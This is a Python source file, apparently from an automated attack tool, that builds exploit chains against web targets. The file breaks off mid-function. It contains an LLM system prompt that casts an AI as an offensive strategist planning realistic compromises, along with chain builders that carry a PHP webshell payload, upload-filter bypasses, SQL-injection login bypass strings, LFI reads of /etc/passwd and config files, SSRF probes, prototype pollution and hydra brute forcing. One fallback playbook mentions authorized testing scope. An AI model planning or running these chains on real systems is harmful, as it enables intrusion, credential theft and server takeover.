"""
ai/chain_planner.py - Exploit Chain Builder
Lên kế hoạch exploit chain dựa trên findings
Ví dụ: user enum → password brute → login → upload plugin → reverse shell
"""

import json
import logging
import re
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field

from core.executor import run_command  # Thêm import để exec tools

logger = logging.getLogger("recon.chain_planner")

# ─── SYSTEM PROMPT FOR CHAIN PLANNING ───────────────────────────────────────
_CHAIN_PLANNER_SYSTEM = """You are an advanced offensive security strategist designing real-world compromise paths.

Your objective: Build multi-step exploitation chains that reflect how attackers actually compromise systems.

CRITICAL SUCCESS FACTORS:
1. Each chain must be REALISTIC and EXECUTABLE
2. Prioritize chains leading to RCE, admin access, or database compromise
3. Consider prerequisites (authentication, file upload capability, API access)
4. Think about persistence, privilege escalation, and lateral movement
5. Identify the MINIMUM STEPS to achieve compromise

REALISTIC HIGH-IMPACT CHAINS:

FILE UPLOAD RCE:
1. Identify file upload endpoint
2. Bypass validation (extension, MIME type, magic bytes)
3. Upload webshell to accessible directory
4. Execute shell → RCE

AUTH BYPASS CHAIN:
1. Enumerate auth endpoints (login, forgot password, signup)
2. Identify bypasses (IDOR user IDs, weak tokens, JWT vulnerabilities)
3. Gain access as other user (ideally admin)
4. If not admin yet, escalate via role manipulation or API

API EXPLOITATION:
1. Discover API endpoints and methods
2. Identify missing authentication or weak validation
3. Manipulate IDs, roles, or permissions
4. Access privileged functions or data

PLUGIN EXPLOITATION:
1. Enumerate plugins (common: WordPress, custom frameworks)
2. Identify known vulnerable versions
3. Exploit vulnerability in plugin code
4. Achieve RCE or admin access

COMMAND INJECTION:
1. Find parameters reaching system commands (ping, host, etc.)
2. Inject shell commands
3. Execute reverse shell → full server access

LFI → RCE:
1. Find LFI vulnerability (file parameter, page parameter, etc.)
2. Read sensitive files (config, /proc/self/environ, mail logs)
3. Extract credentials or write webshell via log poisoning

SSRF CHAIN:
1. Find URL parameter in webhook/callback/fetch endpoint
2. Direct server to internal services (metadata, internal APIs)
3. Extract credentials or tokens
4. Use tokens for further compromise

DESERIALIZATION:
1. Identify serialized data (base64, binary)
2. Craft malicious gadget chain object
3. Trigger execution → RCE

PRIVILEGE ESCALATION CHAIN:
1. Gain low-privilege access
2. Enumerate misconfigurations (SUDO, file permissions, API abuse)
3. Escalate to admin or system access
4. Maintain persistence

EACH CHAIN SHOULD INCLUDE:

1. entry_point
The initial vulnerable endpoint (URL, method, parameters)

2. steps
Ordered exploitation steps with:
- Step name
- Action (what specifically to test or execute)
- Expected result / success indicator
- Tools/techniques needed
- Preconditions (what must be true first)
- Postconditions (what we gain)

3. technique
Main exploitation approach (e.g., "File Upload Bypass + Webshell Execution")

4. expected_impact
What attacker achieves:
- RCE (remote code execution)
- Admin access (full platform control)
- Data access (database, files)
- Credential theft (sessions, API keys)
- Persistence (backdoor, user creation)

5. prerequisites
What must be true:
- Is authentication required?
- Must file upload be enabled?
- Does endpoint exist and respond?
- Are there rate limits or WAF?

6. complexity
Easy: 1-2 steps, no authentication needed
Medium: 3-4 steps, may need auth or enumeration
Hard: 5+ steps, requires multiple vulnerabilities or advanced technique

7. chaining_opportunities
How could this chain with other vulnerabilities for maximum impact?

REMEMBER:
- Think like a penetration tester, not a vulnerability scanner
- Focus on BUSINESS IMPACT (data, control, compromise)
- Prioritize REALISTIC and EXECUTABLE chains
- Consider DEFENDER PERSPECTIVES (how would this be detected/prevented?)

Return ONLY valid JSON."""


@dataclass
class ExploitStep:
    name: str
    action: str
    target: str
    tool: Optional[str] = None
    payload: Optional[str] = None
    depends_on: List[str] = field(default_factory=list)
    success_indicator: str = ""
    priority: int = 5
    preconditions: List[str] = field(default_factory=list)  # e.g., ["authenticated", "file_upload_available"]
    postconditions: List[str] = field(default_factory=list)  # e.g., ["file_written", "code_executed"]


@dataclass
class ExploitChain:
    name: str
    description: str
    steps: List[ExploitStep]
    risk_level: str = "HIGH"
    estimated_time: str = "unknown"
    prerequisites: List[str] = field(default_factory=list)
    preconditions: List[str] = field(default_factory=list)  # Overall chain preconditions
    postconditions: List[str] = field(default_factory=list)  # Overall chain outcomes


class ChainPlanner:
    """
    Plans exploit chains based on discovered vulnerabilities and findings.
    Prioritizes chains by impact and feasibility.
    Uses AI for enhanced chain generation when Groq client available.
    """

    def __init__(self, state, learning_engine=None, groq_client=None):
        self.state = state
        self.learning_engine = learning_engine
        self.groq = groq_client

    def _get_base_url(self) -> str:
        """
        Extract base URL (scheme + domain) from state.
        Infers https:// by default, http:// for non-standard ports.
        Returns fully qualified URL with scheme.
        """
        # Try live_hosts first (they have full URLs)
        live_hosts = self.state.get("live_hosts", [])
        if live_hosts:
            host_url = live_hosts[0].get("url", "")
            if host_url:
                if host_url.startswith(('http://', 'https://')):
                    return host_url.rstrip('/')
        
        # Fall back to target domain
        target = self.state.get("target", "")
        if not target:
            return "https://localhost"
        
        # Add scheme if missing
        if not target.startswith(('http://', 'https://')):
            # Check for non-standard port → use http://
            if ':' in target and not target.startswith('['):  # Not IPv6
                return f"http://{target}"
            # Default to https
            return f"https://{target}"
        
        return target.rstrip('/')

    def _build_full_url(self, path: str) -> str:
        """
        Build full URL from base + path.
        Handles relative paths, ensures scheme is present.
        """
        if not path:
            return self._get_base_url()
        
        # If already has scheme, return as-is
        if path.startswith(('http://', 'https://')):
            return path.rstrip('/')
        
        # Combine base URL with path
        base = self._get_base_url()
        path = path.lstrip('/')
        return f"{base}/{path}"

    def plan_chains_from_graph(self, attack_graph) -> List[ExploitChain]:
        """Plan chains from attack graph analysis"""
        chains = []
        
        # Get top attack chains from graph
        graph_chains = attack_graph.get_top_chains(limit=20)
        
        for chain_data in graph_chains:
            chain = self._build_chain_from_graph_path(chain_data, attack_graph)
            if chain:
                chains.append(chain)
        
        # Add fallback heuristics (WordPress / pattern chains)
        chains.extend(self.plan_chains())

        # Smart prioritization
        chains = self.smart_prioritize(chains)
        
        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains from graph")
        return chains

    def plan_chains_from_context(self, attack_context: Dict) -> List[ExploitChain]:
        """
        Plan exploit chains from enriched attack context.
        Uses AI if available, falls back to heuristic-based generation.
        
        Args:
            attack_context: Dict from AIAnalyzer.build_attack_context()
        
        Returns:
            List of planned ExploitChain objects
        """
        chains = []
        
        # Extract context
        endpoints = attack_context.get('endpoints', [])
        all_hints = set(attack_context.get('vulnerability_hints', []))
        patterns = attack_context.get('chain_patterns', [])
        attack_surface = attack_context.get('attack_surface', {})
        
        logger.info(f"[CHAIN] Planning chains from context with {len(all_hints)} hint types and {len(patterns)} patterns")
        
        # Try AI-assisted chain generation first
        if self.groq:
            try:
                ai_chains = self._generate_chains_with_ai(attack_context)
                if ai_chains:
                    chains.extend(ai_chains)
                    logger.info(f"[CHAIN] AI generated {len(ai_chains)} chains")
            except Exception as e:
                logger.debug(f"[CHAIN] AI chain generation failed: {e}, falling back to heuristics")
        
        # Process identified patterns
        for pattern in patterns:
            chain = self._build_chain_from_pattern(pattern, endpoints)
            if chain:
                chains.append(chain)
                logger.info(f"[CHAIN] Generated pattern-based chain: {chain.name}")
        
        # Generate chains from attack surface
        chains.extend(self._generate_chains_from_attack_surface(attack_surface))
        
        # Generate technology-specific chains
        technologies = attack_context.get('technologies', [])
        chains.extend(self._generate_tech_specific_chains(technologies, endpoints))
        
        # Add chains for misconfigurations
        misconfigs = attack_context.get('misconfigurations', [])
        chains.extend(self._generate_misconfig_chains(misconfigs))
        
        # Priority sort
        chains = self.smart_prioritize(chains)
        
        logger.info(f"[CHAIN] Generated {len(chains)} chains from enriched context")
        return chains

    def _build_chain_from_pattern(self, pattern: Dict, endpoints: List[Dict]) -> Optional[ExploitChain]:
        """Build a chain from an identified attack pattern."""
        pattern_name = pattern.get('name', '')
        description = pattern.get('description', '')
        probability = pattern.get('probability', 0.5)
        
        if probability < 0.4:
            return None  # Skip low-probability patterns
        
        # Map pattern names to chain builders
        if pattern_name == 'file_upload_to_rce':
            upload_ep = pattern.get('upload_endpoint')
            return self._build_upload_to_rce_chain(upload_ep)
        
        elif pattern_name == 'auth_bypass_to_privilege_escalation':
            return self._build_auth_to_priv_chain()
        
        elif pattern_name == 'ssrf_chain':
            return self._build_ssrf_exploitation_chain()
        
        elif pattern_name == 'enum_then_attack':
            return self._build_enum_attack_chain()
        
        return None

    def _generate_chains_from_attack_surface(self, attack_surface: Dict) -> List[ExploitChain]:
        """Generate chains targeting specific attack surface elements."""
        chains = []
        
        # File upload endpoints
        upload_eps = attack_surface.get('file_upload_endpoints', [])
        if upload_eps:
            for ep in upload_eps[:3]:  # Limit to top 3
                chain = self._build_upload_to_rce_chain(ep.get('url'))
                if chain:
                    chains.append(chain)
        
        # Authentication endpoints
        auth_eps = attack_surface.get('auth_endpoints', [])
        if auth_eps:
            chains.append(self._build_auth_to_priv_chain(auth_eps[0]))
        
        # API endpoints
        api_eps = attack_surface.get('api_endpoints', [])
        if api_eps:
            chains.append(self._build_api_attack_chain(api_eps[0]))
        
        # Admin endpoints
        admin_eps = attack_surface.get('admin_endpoints', [])
        if admin_eps:
            chains.append(self._build_admin_access_chain(admin_eps[0]))
        
        return chains

    def _generate_tech_specific_chains(self, technologies: List[str], endpoints: List[Dict]) -> List[ExploitChain]:
        """Generate chains based on detected technologies."""
        chains = []
        tech_lower = [t.lower() for t in (technologies or [])]
        
        # WordPress
        if any('wordpress' in t or 'wp' in t for t in tech_lower):
            wp_eps = [e for e in endpoints if 'wp' in e.get('url', '').lower()]
            if wp_eps:
                chains.append(self._build_wordpress_attack_chain(wp_eps[0]))
        
        # PHP
        if any('php' in t for t in tech_lower):
            chains.append(self._build_php_exploitation_chain(endpoints))
        
        # Node.js / Express
        if any('node' in t or 'express' in t for t in tech_lower):
            chains.append(self._build_nodejs_attack_chain(endpoints))
        
        return chains

    def _generate_misconfig_chains(self, misconfigs: List[Dict]) -> List[ExploitChain]:
        """Generate chains that exploit misconfigurations."""
        chains = []
        
        for misconfig in misconfigs[:5]:
            config_type = misconfig.get('type', '')
            endpoint = misconfig.get('endpoint', '')
            severity = misconfig.get('severity', 'MEDIUM')
            
            if config_type == 'admin_panel_unauthenticated':
                chains.append(self._build_pattern_chain(
                    name="Unauthenticated Admin Access",
                    description="Access exposed admin panel without authentication",
                    steps=[
                        ExploitStep(
                            name="Access admin panel",
                            action="direct_access",
                            target=endpoint,
                            tool="browser",
                            success_indicator="Admin panel loaded"
                        ),
                        ExploitStep(
                            name="Exploit admin functions",
                            action="admin_exploitation",
                            target=endpoint,
                            tool="curl",
                            success_indicator="System compromised"
                        )
                    ],
                    risk_level="CRITICAL"
                ))
            
            elif config_type == 'debug_endpoint_exposed':
                chains.append(self._build_pattern_chain(
                    name="Debug Endpoint Information Disclosure",
                    description="Extract sensitive information from exposed debug endpoint",
                    steps=[
                        ExploitStep(
                            name="Access debug endpoint",
                            action="information_gathering",
                            target=endpoint,
                            tool="browser",
                            success_indicator="Debug information visible"
                        ),
                        ExploitStep(
                            name="Extract credentials",
                            action="credential_extraction",
                            target=endpoint,
                            tool="curl",
                            success_indicator="Credentials obtained"
                        )
                    ],
                    risk_level="HIGH"
                ))
            
            elif config_type == 'backup_file_exposed':
                chains.append(self._build_pattern_chain(
                    name="Backup File Extraction",
                    description="Download and analyze backup files for sensitive data",
                    steps=[
                        ExploitStep(
                            name="Download backup file",
                            action="file_download",
                            target=endpoint,
                            tool="wget",
                            success_indicator="Backup file downloaded"
                        ),
                        ExploitStep(
                            name="Extract sensitive data",
                            action="data_extraction",
                            target=endpoint,
                            tool="custom_script",
                            success_indicator="Credentials/secrets obtained"
                        )
                    ],
                    risk_level="HIGH"
                ))
        
        return chains

    def _build_upload_to_rce_chain(self, upload_url: str) -> Optional[ExploitChain]:
        """Build file upload to RCE chain."""
        if not upload_url:
            return None
        
        return self._build_pattern_chain(
            name="File Upload to Remote Code Execution",
            description=f"Upload malicious file via {upload_url} and achieve RCE",
            steps=[
                ExploitStep(
                    name="Test upload endpoint",
                    action="upload_test",
                    target=upload_url,
                    tool="curl",
                    success_indicator="File uploaded successfully"
                ),
                ExploitStep(
                    name="Bypass upload restrictions",
                    action="bypass_restrictions",
                    target=upload_url,
                    tool="curl",
                    payload=".php.jpg / .phtml",
                    success_indicator="Restriction bypassed"
                ),
                ExploitStep(
                    name="Upload webshell",
                    action="file_upload",
                    target=upload_url,
                    tool="curl",
                    payload="<?php system($_GET['cmd']); ?>",
                    success_indicator="Webshell uploaded"
                ),
                ExploitStep(
                    name="Execute commands",
                    action="code_execution",
                    target=self._build_full_url(upload_url.split('/')[-1]),
                    tool="curl",
                    success_indicator="Remote code execution achieved"
                )
            ],
            risk_level="CRITICAL"
        )

    def _build_auth_to_priv_chain(self, auth_ep: Dict = None) -> ExploitChain:
        """Build authentication bypass to privilege escalation chain."""
        target = auth_ep.get('url') if auth_ep else "login"
        
        return self._build_pattern_chain(
            name="Authentication Bypass and Privilege Escalation",
            description="Bypass authentication and escalate privileges to admin",
            steps=[
                ExploitStep(
                    name="Test authentication bypass",
                    action="auth_bypass_test",
                    target=target,
                    tool="curl",
                    payload="admin:admin / ' OR '1'='1",
                    success_indicator="Authentication bypassed"
                ),
                ExploitStep(
                    name="Gain user session",
                    action="session_hijacking",
                    target=target,
                    tool="burp",
                    success_indicator="Valid session obtained"
                ),
                ExploitStep(
                    name="Escalate to admin",
                    action="privilege_escalation",
                    target=target,
                    tool="curl",
                    success_indicator="Admin access obtained"
                )
            ],
            risk_level="CRITICAL"
        )

    def _build_ssrf_exploitation_chain(self) -> ExploitChain:
        """Build SSRF exploitation chain."""
        return self._build_pattern_chain(
            name="SSRF to Internal Network Access",
            description="Exploit Server-Side Request Forgery to access internal network",
            steps=[
                ExploitStep(
                    name="Identify SSRF parameters",
                    action="vulnerability_identification",
                    target="",
                    tool="burp",
                    success_indicator="Vulnerable parameter found"
                ),
                ExploitStep(
                    name="Probe internal services",
                    action="internal_scanning",
                    target="http://localhost:8080",
                    tool="curl",
                    payload="http://internal-service/admin",
                    success_indicator="Internal service accessible"
                ),
                ExploitStep(
                    name="Exploit internal service",
                    action="service_exploitation",
                    target="",
                    tool="custom_script",
                    success_indicator="Internal service compromised"
                )
            ],
            risk_level="HIGH"
        )

    def _build_enum_attack_chain(self) -> ExploitChain:
        """Build user enumeration to attack chain."""
        return self._build_pattern_chain(
            name="User Enumeration and Targeted Attack",
            description="Enumerate valid users and launch targeted attacks",
            steps=[
                ExploitStep(
                    name="Enumerate users",
                    action="user_enumeration",
                    target="",
                    tool="custom_script",
                    success_indicator="Valid users identified"
                ),
                ExploitStep(
                    name="Brute force credentials",
                    action="brute_force",
                    target="",
                    tool="hydra",
                    success_indicator="Credentials obtained"
                ),
                ExploitStep(
                    name="Exploit with credentials",
                    action="exploitation",
                    target="",
                    tool="curl",
                    success_indicator="System compromised"
                )
            ],
            risk_level="HIGH"
        )

    def _build_api_attack_chain(self, api_ep: Dict) -> ExploitChain:
        """Build API-specific attack chain."""
        return self._build_pattern_chain(
            name="API Abuse and Exploitation",
            description=f"Exploit API endpoint at {api_ep.get('url')}",
            steps=[
                ExploitStep(
                    name="Analyze API",
                    action="api_analysis",
                    target=api_ep.get('url'),
                    tool="burp",
                    success_indicator="API structure understood"
                ),
                ExploitStep(
                    name="Test for authentication",
                    action="auth_test",
                    target=api_ep.get('url'),
                    tool="curl",
                    success_indicator="Authentication requirements identified"
                ),
                ExploitStep(
                    name="Exploit API",
                    action="api_exploitation",
                    target=api_ep.get('url'),
                    tool="curl",
                    success_indicator="Sensitive data accessed"
                )
            ],
            risk_level="HIGH"
        )

    def _build_admin_access_chain(self, admin_ep: Dict) -> ExploitChain:
        """Build admin panel access chain."""
        return self._build_pattern_chain(
            name="Admin Panel Unauthorized Access",
            description=f"Gain unauthorized access to admin panel at {admin_ep.get('url')}",
            steps=[
                ExploitStep(
                    name="Access admin panel",
                    action="direct_access",
                    target=admin_ep.get('url'),
                    tool="browser",
                    success_indicator="Admin panel accessible"
                ),
                ExploitStep(
                    name="Bypass authentication",
                    action="auth_bypass",
                    target=admin_ep.get('url'),
                    tool="curl",
                    success_indicator="Authentication bypassed"
                ),
                ExploitStep(
                    name="Exploit admin functions",
                    action="admin_exploitation",
                    target=admin_ep.get('url'),
                    tool="curl",
                    success_indicator="System compromised"
                )
            ],
            risk_level="CRITICAL"
        )

    def _build_wordpress_attack_chain(self, wp_ep: Dict) -> ExploitChain:
        """Build WordPress-specific attack chain."""
        return self._build_pattern_chain(
            name="WordPress Plugin/Theme Exploitation",
            description="Exploit WordPress vulnerabilities for RCE",
            steps=[
                ExploitStep(
                    name="Enumerate WordPress",
                    action="wp_enumeration",
                    target=wp_ep.get('url'),
                    tool="wpscan",
                    success_indicator="WordPress version and plugins identified"
                ),
                ExploitStep(
                    name="Identify vulnerable plugins",
                    action="vulnerability_scanning",
                    target=wp_ep.get('url'),
                    tool="wpscan",
                    success_indicator="Vulnerable plugin found"
                ),
                ExploitStep(
                    name="Exploit plugin",
                    action="plugin_exploitation",
                    target=wp_ep.get('url'),
                    tool="exploit_framework",
                    success_indicator="Remote code execution achieved"
                )
            ],
            risk_level="HIGH"
        )

    def _build_php_exploitation_chain(self, endpoints: List[Dict]) -> ExploitChain:
        """Build PHP-specific exploitation chain."""
        return self._build_pattern_chain(
            name="PHP Code Injection",
            description="Exploit PHP-specific vulnerabilities like code injection",
            steps=[
                ExploitStep(
                    name="Identify injection points",
                    action="vulnerability_identification",
                    target="",
                    tool="burp",
                    success_indicator="Injection point found"
                ),
                ExploitStep(
                    name="Test code injection",
                    action="code_injection_test",
                    target="",
                    tool="curl",
                    payload="<?php phpinfo(); ?>",
                    success_indicator="Code injection confirmed"
                ),
                ExploitStep(
                    name="Execute commands",
                    action="code_execution",
                    target="",
                    tool="curl",
                    success_indicator="Remote code execution"
                )
            ],
            risk_level="HIGH"
        )

    def _build_nodejs_attack_chain(self, endpoints: List[Dict]) -> ExploitChain:
        """Build Node.js/Express-specific attack chain."""
        return self._build_pattern_chain(
            name="Node.js Prototype Pollution",
            description="Exploit prototype pollution in Node.js applications",
            steps=[
                ExploitStep(
                    name="Test prototype pollution",
                    action="pollution_test",
                    target="",
                    tool="curl",
                    payload="?__proto__[admin]=true",
                    success_indicator="Prototype pollution confirmed"
                ),
                ExploitStep(
                    name="Escalate privileges",
                    action="privilege_escalation",
                    target="",
                    tool="curl",
                    success_indicator="Admin access obtained"
                )
            ],
            risk_level="HIGH"
        )

    def build_manual_playbook(self, chains: List[ExploitChain]) -> List[Dict]:
        """
        Build a human-executable validation playbook from planned chains.
        Output is intentionally procedural for manual testers.
        """
        playbook: List[Dict] = []
        vulnerabilities = self.state.get("confirmed_vulnerabilities", []) or []
        prioritized = self.state.get("prioritized_endpoints", []) or []
        target = self.state.get("target", "")

        for idx, chain in enumerate(chains[:5], 1):
            chain_steps = []
            for s_idx, step in enumerate(chain.steps[:8], 1):
                chain_steps.append(
                    {
                        "step": s_idx,
                        "title": step.name,
                        "action": step.action,
                        "target": step.target,
                        "tool": step.tool or "manual",
                        "success_criteria": step.success_indicator or "observable response change",
                        "notes": "Validate carefully and capture request/response evidence.",
                    }
                )
            playbook.append(
                {
                    "id": f"CHAIN-{idx:02d}",
                    "name": chain.name,
                    "risk_level": chain.risk_level,
                    "goal": chain.description,
                    "estimated_time": chain.estimated_time,
                    "preconditions": chain.preconditions or chain.prerequisites or ["target reachable"],
                    "steps": chain_steps,
                }
            )

        # Ensure at least one actionable chain for testers.
        if not playbook:
            seed_endpoint = ""
            if vulnerabilities:
                seed_endpoint = vulnerabilities[0].get("endpoint") or vulnerabilities[0].get("url", "")
            if not seed_endpoint and prioritized:
                seed_endpoint = prioritized[0].get("url", "")
            playbook.append(
                {
                    "id": "CHAIN-01",
                    "name": "Manual Verification Baseline Chain",
                    "risk_level": "MEDIUM",
                    "goal": f"Establish reproducible validation flow for {target}",
                    "estimated_time": "20-40 min",
                    "preconditions": ["target reachable", "authorized testing scope confirmed"],
                    "steps": [
                        {
                            "step": 1,
                            "title": "Reproduce endpoint behavior",
                            "action": "baseline_request",
                            "target": seed_endpoint or target,
                            "tool": "browser+proxy",
                            "success_criteria": "stable baseline response captured",
                            "notes": "Capture request/response pair and timing.",
                        },
                        {
                            "step": 2,
                            "title": "Inject controlled test input",
                            "action": "parameter_manipulation",
                            "target": seed_endpoint or target,
                            "tool": "repeater",
                            "success_criteria": "input reflection or logic deviation observed",
                            "notes": "Keep payloads non-destructive; compare against baseline.",
                        },
                        {
                            "step": 3,
                            "title": "Cross-check with second method",
                            "action": "secondary_validation",
                            "target": seed_endpoint or target,
                            "tool": "alt-tool",
                            "success_criteria": "same behavior reproduced independently",
                            "notes": "Use another tool or role context to avoid false positives.",
                        },
                        {
                            "step": 4,
                            "title": "Document exploitability decision",
                            "action": "manual_triage",
                            "target": seed_endpoint or target,
                            "tool": "reporting",
                            "success_criteria": "clear pass/fail + evidence bundle",
                            "notes": "Mark as confirmed/rejected with concrete artifacts.",
                        },
                    ],
                }
            )

        return playbook

    def _build_chain_from_graph_path(self, chain_data: Dict, attack_graph) -> Optional[ExploitChain]:
        """Build an ExploitChain from a graph path"""
        path = chain_data.get('path', [])
        if len(path) < 2:
            return None
            
        # Get node data
        nodes = []
        for node_id in path:
            node_data = attack_graph.graph.nodes[node_id]
            nodes.append(node_data)
        
        # Build chain name
        start_type = nodes[0].get('vuln_type', 'unknown')
        end_type = nodes[-1].get('vuln_type', 'unknown')
        chain_name = f"{start_type.title()} → {end_type.title()} Chain"
        
        # Build steps
        steps = []
        for i, node in enumerate(nodes):
            step = ExploitStep(
                name=f"Exploit {node.get('name', f'Vuln {i+1}')}",
                action=f"exploit_{node.get('vuln_type', 'unknown')}",
                target=node.get('endpoint', ''),
                tool=self._get_tool_for_vuln_type(node.get('vuln_type', '')),
                success_indicator=f"{node.get('vuln_type', 'unknown')} exploited",
                priority=10 - i  # Decreasing priority
            )
            steps.append(step)
        
        # Calculate risk level
        risk_levels = [node.get('severity', 'MEDIUM') for node in nodes]
        risk_level = 'CRITICAL' if 'CRITICAL' in risk_levels else 'HIGH' if 'HIGH' in risk_levels else 'MEDIUM'
        
        return ExploitChain(
            name=chain_name,
            description=f"Attack chain from {start_type} to {end_type} via {len(path)} steps",
            risk_level=risk_level,
            estimated_time=f"{len(path) * 5}-{len(path) * 15} min",
            prerequisites=[f"{nodes[0].get('vuln_type')} vulnerability"],
            steps=steps
        )

    def _get_tool_for_vuln_type(self, vuln_type: str) -> str:
        """Get appropriate tool for vulnerability type"""
        tool_map = {
            'sqli': 'sqlmap',
            'xss': 'custom_script',
            'rce': 'curl',
            'file_upload': 'curl',
            'lfi': 'curl',
            'auth_bypass': 'curl',
            'csrf': 'curl'
        }
        return tool_map.get(vuln_type.lower(), 'curl')

    def plan_chains(self) -> List[ExploitChain]:
        """Analyze state and build relevant exploit chains"""
        chains = []

        # NEW: Pattern-based chain generation from hints
        hint_chains = self._generate_chains_from_hints()
        chains.extend(hint_chains)

        # Detect patterns for chains
        pattern_chains = self._detect_chain_patterns()
        chains.extend(pattern_chains)
        chains.extend(self._build_conditioned_wp_chains())

        vulns = self.state.get("vulnerabilities", [])
        wp_detected = self.state.get("wordpress_detected", False)

        vulns = self.state.get("vulnerabilities", [])
        wp_detected = self.state.get("wordpress_detected", False)
        wp_users = self.state.get("wp_users", [])
        wp_plugins = self.state.get("wp_plugins", [])
        endpoints = self.state.get("prioritized_endpoints", [])

        # Check for SQLi vulnerabilities
        sqli_vulns = [v for v in vulns if "sql" in v.get("name", "").lower() or
                      v.get("type", "") == "SQLI"]
        if sqli_vulns:
            chains.append(self._build_sqli_chain(sqli_vulns[0]))

        # WordPress chains
        if wp_detected:
            # WP user enumeration → brute → admin access → RCE chain
            if wp_users:
                chains.append(self._build_wp_admin_chain(wp_users))

            # XML-RPC bruteforce chain
            wp_xmlrpc = any(
                "xmlrpc" in f.get("type", "").lower() or "xmlrpc" in f.get("url", "").lower()
                for h_results in [self.state.get("wp_vulns", [])]
                for f in h_results
            )
            if wp_xmlrpc or wp_detected:
                chains.append(self._build_xmlrpc_chain(wp_users))

            # Vulnerable plugin chain
            vuln_plugins = [p for p in wp_plugins if p.get("vulnerabilities")]
            if vuln_plugins:
                chains.append(self._build_wp_plugin_chain(vuln_plugins[0]))

        # File upload chain
        upload_endpoints = [
            ep for ep in endpoints
            if ep.get("score", 0) >= 8 and "upload" in ep.get("url", "").lower()
        ]
        if upload_endpoints:
            chains.append(self._build_upload_chain(upload_endpoints[0]))

        # LFI chain
        lfi_endpoints = [
            ep for ep in endpoints
            if any(r in ep.get("url", "") for r in ["file=", "page=", "include=", "path="])
        ]
        if lfi_endpoints:
            chains.append(self._build_lfi_chain(lfi_endpoints[0]))

        # XSS → Session hijack chain
        xss_vulns = [v for v in vulns if "xss" in v.get("name", "").lower() or
                     "cross-site" in v.get("name", "").lower()]
        if xss_vulns:
            chains.append(self._build_xss_chain(xss_vulns[0]))

        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains")
        for chain in chains:
            logger.info(f"[CHAIN] → [{chain.risk_level}] {chain.name}")

        # Smart prioritization
        chains = self.smart_prioritize(chains)

        return chains

    def _generate_chains_from_hints(self) -> List[ExploitChain]:
        """
        Generate exploit chains from vulnerability hints in endpoint metadata.
        This is the key intelligence enhancement.
        """
        chains = []
        endpoints = self.state.get("prioritized_endpoints", []) or []
        
        # Collect all vulnerability hints from endpoints
        hint_inventory = {}  # hint -> [endpoints]
        for ep in endpoints:
            hints = ep.get('vulnerability_hints', [])
            for hint in hints:
                if hint not in hint_inventory:
                    hint_inventory[hint] = []
                hint_inventory[hint].append(ep)
        
        logger.info(f"[CHAIN] Found {len(hint_inventory)} unique vulnerability hints")
        
        # Pattern 1: File upload + executable directory → RCE
        if 'file_upload' in hint_inventory and any(h in hint_inventory for h in ['rce_via_upload', 'rce']):
            upload_ep = hint_inventory['file_upload'][0]
            chains.append(self._build_pattern_chain(
                name="File Upload to RCE",
                description="Upload file to executable directory and achieve code execution",
                steps=[
                    ExploitStep(
                        name="Identify upload endpoint",
                        action="reconnaissance",
                        target=upload_ep.get('url'),
                        tool="browser",
                        success_indicator="Upload form found"
                    ),
                    ExploitStep(
                        name="Upload webshell",
                        action="file_upload",
                        target=upload_ep.get('url'),
                        tool="curl",
                        payload="webshell.php",
                        success_indicator="File uploaded successfully"
                    ),
                    ExploitStep(
                        name="Execute uploaded file",
                        action="code_execution",
                        target=upload_ep.get('url') + "/webshell.php",
                        tool="curl",
                        success_indicator="Remote code execution achieved"
                    )
                ],
                risk_level="CRITICAL"
            ))
        
        # Pattern 2: LFI + Debug info → Information disclosure → RCE
        if 'lfi' in hint_inventory:
            lfi_eps = hint_inventory['lfi']
            chains.append(self._build_pattern_chain(
                name="Local File Inclusion to Information Disclosure",
                description="Use LFI to read sensitive files and extract credentials",
                steps=[
                    ExploitStep(
                        name="Enumerate files via LFI",
                        action="local_file_inclusion",
                        target=lfi_eps[0].get('url'),
                        tool="curl",
                        payload="../../../etc/passwd",
                        success_indicator="System files readable"
                    ),
                    ExploitStep(
                        name="Extract configuration",
                        action="configuration_extraction",
                        target=lfi_eps[0].get('url'),
                        tool="curl",
                        payload="../../../config/database.yml",
                        success_indicator="Database credentials obtained"
                    ),
                    ExploitStep(
                        name="Use credentials for escalation",
                        action="credential_exploitation",
                        target=self._get_base_url(),
                        tool="sqlmap",
                        success_indicator="Database access obtained"
                    )
                ],
                risk_level="HIGH"
            ))
        
        # Pattern 3: SSRF → Internal network access
        if 'ssrf' in hint_inventory:
            ssrf_eps = hint_inventory['ssrf']
            chains.append(self._build_pattern_chain(
                name="SSRF to Internal Resource Access",
                description="Use Server-Side Request Forgery to access internal services",
                steps=[
                    ExploitStep(
                        name="Identify SSRF parameter",
                        action="vulnerability_identification",
                        target=ssrf_eps[0].get('url'),
                        tool="burp",
                        success_indicator="SSRF parameter found"
                    ),
                    ExploitStep(
                        name="Probe internal services",
                        action="internal_reconnaissance",
                        target=ssrf_eps[0].get('url'),
                        tool="curl",
                        payload="http://localhost:8080/admin",
                        success_indicator="Internal service accessible"
                    ),
                    ExploitStep(
                        name="Exploit internal service",
                        action="service_exploitation",
                        target=ssrf_eps[0].get('url'),
                        tool="custom_script",
                        success_indicator="Internal service compromised"
                    )
                ],
                risk_level="HIGH"
            ))
        
        # Pattern 4: Auth bypass + admin endpoint → Account takeover
        if 'auth_bypass' in hint_inventory and 'admin' in [ep.get('endpoint_type', '') for ep in endpoints]:
            admin_eps = [ep for ep in endpoints if ep.get('endpoint_type', '') == 'admin']
            if admin_eps:
                chains.append(self._build_pattern_chain(
                    name="Authentication Bypass to Admin Access",
                    description="Bypass authentication and gain administrative access",
                    steps=[
                        ExploitStep(
                            name="Test authentication bypass",
                            action="auth_test",
                            target=admin_eps[0].get('url'),
                            tool="curl",
                            payload="admin:admin",
                            success_indicator="Authentication bypassed"
                        ),
                        ExploitStep(
                            name="Gain admin access",
                            action="privilege_escalation",
                            target=admin_eps[0].get('url'),
                            tool="browser",
                            success_indicator="Admin panel accessed"
                        ),
                        ExploitStep(
                            name="Exploit admin functionality",
                            action="admin_exploitation",
                            target=admin_eps[0].get('url'),
                            tool="curl",
                            success_indicator="System compromised"
                        )
                    ],
                    risk_level="CRITICAL"
                ))
        
        # Pattern 5: User enumeration + brute force → Account takeover
        if 'user_enumeration' in hint_inventory:
            auth_eps = [ep for ep in endpoints if ep.get('endpoint_type', '') == 'auth']
            if auth_eps:
                chains.append(self._build_pattern_chain(
                    name="User Enumeration to Account Takeover",
                    description="Enumerate valid users and brute force credentials",
                    steps=[
                        ExploitStep(
                            name="Enumerate users",
                            action="user_enumeration",
                            target=auth_eps[0].get('url'),
